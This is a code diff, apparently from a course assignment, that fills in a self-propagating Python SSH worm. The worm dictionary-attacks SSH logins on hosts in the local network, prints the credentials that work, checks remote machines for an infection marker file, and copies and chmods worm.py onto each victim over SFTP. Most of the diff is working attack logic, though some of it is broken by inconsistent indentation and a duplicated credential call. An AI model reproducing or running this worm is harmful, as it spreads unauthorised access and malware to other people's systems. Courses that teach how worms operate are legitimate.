@@ -39,7 +39,7 @@ def markInfected():
 	# this is to create a file called infected.txt
 	# in directory /tmp/
     print("Mark file infected")
-    worm = open(INFECTED_MARKER_FILE, 'w')
+    worm = open(INFECTED_MARKER_FILE, "w")
     worm.write("Your system has been infected")
     worm.close()
 
@@ -62,19 +62,12 @@ def spreadAndExecute(sshClient):
 	# is very similar to that code.	
     
         sftpClient = sshClient.open_sftp()
-	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
-	stfpClient.chmod("/temp/worm.py", 0777)
-	sshClient.exec_command("chmod a+x /tmp/worm/py")
     
-   # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+   	sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
     
-   # for (ssh.connect(sshClient, username, password)) in credList:
-    
-   # sftpClient = ssh.open_sftp()
-    
-   # sftpClient.put("worm.py", "/tmp/" + "worm.py")
-    
-   # ssh.exec_command("chmod a+x /tmp/worm.py")
+	sftpClient.chmod("/tmp/worm.py", 0777)	
+
+   	sshClient.exec_command("chmod a+x /tmp/worm.py")
  
 
 
@@ -110,23 +103,23 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	
-	connection = 1
  
-        print("Try to connect to host host using username and password")
-    	try:
-             sshClient.connect(host, userName, password)
-             print("Opened a connectin to the victim's system!")
-             connection = 0
-        except paramiko.SSHException:
-             print("Wrong credentials :(")
-             connection = 1
-        except socket.error:
-             print("Server is down or has some other problem")
-             connection 3
-		
-	return connection
+	#connected = 1
 
+        print("Try to connect to " + host +  " using " +  userName + " and " +  password)
+    	try:
+             sshClient.connect(host, username = userName, password = password)
+             print("Opened a connectin to the victim's system!")
+	     print("Credentials " + userName + " and " + password + " worked.")
+	     return 0             
+        except paramiko.SSHException:
+             print("Wrong credentials! Try again.")
+             return 1
+        except socket.error:
+             print("Server is down or has some other problem.")
+             return 3
+
+	#return connected
 ###############################################################
 # Wages a dictionary attack against the host
 # @param host - the host to attack
@@ -162,9 +155,11 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		if(0 == tryCredentials(host, username, password, ssh)):
-                     print("Successfully compromised the system, it returned 0")
-                     return(ssh, username, password)
+		
+		if (0 == tryCredentials(host, username,password,ssh)):
+                    	value = tryCredentials(host, username, password, ssh)
+			print("Successfully compromised the system!")
+			return ssh
 			
 	# Could not find working credentials
 	return None	
@@ -180,23 +175,7 @@ def getMyIP(interface):
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
  
-        # The IP address
-        ipAddr = None
- 
-        # Go through all the interfaces
-        for netFace in interface:
-        
-            # The IP address of the interface
-                addr = netifaces.ifaddresses(netFace)[2][0]['addr']
-                
-                # Get the IP address
-                if not addr == "127.0.0.1":
-                    
-                    # Save the IP addrss and break
-                    ipAddr = addr
-                    break
-        print("Current IP of the current system" + ipAddr)
-	return ipAddr
+	return netinfo.get_ip(interface)
 
 #######################################################
 # Returns the list of systems on the same network
@@ -259,18 +238,21 @@ if len(sys.argv) < 2:
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
-	pass
+	if not (isInfectedSystem()):
 # TODO: Get the IP of the current system
-
+		myIP = getMyIP("enp0s3")
+		print("Attacker's current system IP " + myIP)
 
 # Get the hosts on the same network
-networkHosts = getHostsOnTheSameNetwork()
+	print(" Get the hosts on the same network")
+	networkHosts = getHostsOnTheSameNetwork()
 
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
+	networkHosts.remove(myIP)
 
-print "Found hosts: ", networkHosts
+	print "Found hosts: ", networkHosts
 
 
 # Go through the network hosts
@@ -286,36 +268,16 @@ for host in networkHosts:
 	if sshInfo:
 		
 		print "Trying to spread"
-		
-		# TODO: Check if the system was	
-		# already infected. This can be
-		# done by checking whether the
-		# remote system contains /tmp/infected.txt
-		# file (which the worm will place there
-		# when it first infects the system)
-		# This can be done using code similar to
-		# the code below:
-		# try:
-        #	 remotepath = '/tmp/infected.txt'
-		#        localpath = '/home/cpsc/'
-		#	 # Copy the file from the specified
-		#	 # remote path to the specified
-		# 	 # local path. If the file does exist
-		#	 # at the remote path, then get()
-		# 	 # will throw IOError exception
-		# 	 # (that is, we know the system is
-		# 	 # not yet infected).
-		# 
-		#        sftp.get(filepath, localpath)
-		# except IOError:
-		#       print "This system should be infected"
-		#
-		#
-		# If the system was already infected proceed.
-		# Otherwise, infect the system and terminate.
-		# Infect that system
-		spreadAndExecute(sshInfo[0])
-		
-		print "Spreading complete"	
+	
+		try:
+			sftp = sshInfo.open_sftp()
+        	 	remotepath = '/tmp/infected.txt'
+		        localpath = '/home/cpsc/'
+			sftp.get(remotepath, localpath)
+			print("This system is already infected!")
+		except IOError:
+		       	print "This system should be infected"
+			spreadAndExecute(sshInfo)
+			print "Spreading complete"	
 	
 
